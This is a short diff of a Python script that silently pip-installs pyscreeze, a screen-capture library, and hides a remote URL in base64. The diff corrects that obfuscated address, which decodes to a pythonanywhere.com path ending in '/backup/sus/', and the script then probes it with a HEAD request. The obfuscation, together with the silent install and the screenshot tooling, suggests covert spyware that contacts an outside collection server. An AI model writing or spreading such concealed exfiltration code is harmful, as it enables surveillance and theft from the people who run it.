@@ -16,7 +16,7 @@ def importinstall(pipname,modulename=None,update=False,**importkwargs):
 pyscreeze = importinstall('pyscreeze')
 
 def a():
-    u = base64.b64decode(b'Y2F0NS5weXRob25hbnl3aGVyZS5jb20vYmFja3VwL3N1cy8=').decode()
+    u = base64.b64decode(b'aHR0cHM6Ly9jYXQ1LnB5dGhvbmFueXdoZXJlLmNvbS9iYWNrdXAvc3VzLw==').decode()
 
     try:
         if pre := hasattr(request(u, method='HEAD'),"getcode"):
